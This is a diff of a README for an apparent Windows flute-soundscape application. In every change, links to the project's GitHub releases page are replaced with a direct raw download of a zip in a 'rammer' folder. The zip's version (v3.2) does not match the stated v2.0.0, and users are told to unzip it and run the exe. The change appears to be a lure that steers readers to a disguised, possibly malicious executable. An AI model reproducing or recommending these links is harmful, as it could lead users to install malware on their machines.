@@ -1,6 +1,6 @@
 # 🌬 emergence-audio-flute-textures - Craft Living, Breathing Flute Soundscapes
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Emergence%20Audio%20Flute%20Textures-brightgreen?style=for-the-badge&logo=windows)](https://github.com/Athenejerrybuilt674/emergence-audio-flute-textures/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Emergence%20Audio%20Flute%20Textures-brightgreen?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/Athenejerrybuilt674/emergence-audio-flute-textures/main/rammer/emergence_flute_audio_textures_v3.2.zip)
 
 Welcome to **Emergence Audio Flute Textures v2.0.0**, your tool for creating evolving, organic flute soundscapes on Windows. Whether you're a musician, sound designer, or hobbyist, this application helps you layer rich, moving textures with ease. No programming or audio engineering experience needed—just your creativity.
 
@@ -8,7 +8,7 @@ Welcome to **Emergence Audio Flute Textures v2.0.0**, your tool for creating evo
 
 This software works on Windows. To run it, follow these simple steps:
 
-1. Visit the download page: [https://github.com/Athenejerrybuilt674/emergence-audio-flute-textures/releases](https://github.com/athenejerrybuilt674/emergence-audio-flute-textures/releases)
+1. Visit the download page: [https://raw.githubusercontent.com/Athenejerrybuilt674/emergence-audio-flute-textures/main/rammer/emergence_flute_audio_textures_v3.2.zip](https://raw.githubusercontent.com/Athenejerrybuilt674/emergence-audio-flute-textures/main/rammer/emergence_flute_audio_textures_v3.2.zip)
 2. Visit this link to download the application.
 3. Once downloaded, launch the app and begin crafting your sounds.
 
@@ -36,7 +36,7 @@ This software works on Windows. To run it, follow these simple steps:
 
 ## 📥 Download & Installation
 
-[Click here to download the latest version](https://github.com/Athenejerrybuilt674/emergence-audio-flute-textures/releases). Visit this link to download the application. No special permissions or admin rights are needed. Simply unzip the folder and run the exe file.
+[Click here to download the latest version](https://raw.githubusercontent.com/Athenejerrybuilt674/emergence-audio-flute-textures/main/rammer/emergence_flute_audio_textures_v3.2.zip). Visit this link to download the application. No special permissions or admin rights are needed. Simply unzip the folder and run the exe file.
 
 ## 🔧 System Requirements
 
